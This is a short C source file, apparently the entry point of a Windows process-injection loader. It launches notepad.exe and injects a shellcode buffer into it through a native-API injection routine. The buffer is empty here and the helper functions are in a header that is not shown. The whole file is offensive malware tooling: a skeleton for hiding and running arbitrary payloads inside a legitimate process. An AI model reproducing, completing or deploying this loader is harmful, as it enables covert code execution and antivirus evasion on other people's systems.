#include "NativeApiInjection.h"

#define TARGET_PROCESS L"C:\\Windows\\System32\\notepad.exe"

int main()
{

		UCHAR Shellcode[] = {
	
		};

	SIZE_T PayloadSize = sizeof(Shellcode);
	HANDLE ProcessHandle = NULL;
	HANDLE ThreadHandle = NULL;

	if (!CreateTargetProcess(TARGET_PROCESS, &ProcessHandle, &ThreadHandle))
	{
		WARN("Failed To Create a New Process: %ls", TARGET_PROCESS);
		PRINT_ERROR("CreateTargetProcess");
		return 1;
	}

	if (!NativeApiInjection(Shellcode, PayloadSize, ProcessHandle, ThreadHandle))
	{
		WARN("Failed To Inject Via Native Api!");
		PRINT_ERROR("NativeApiInjection");
		return 1;
	}

	CHAR("Quit...");
	getchar();

	return 0;

}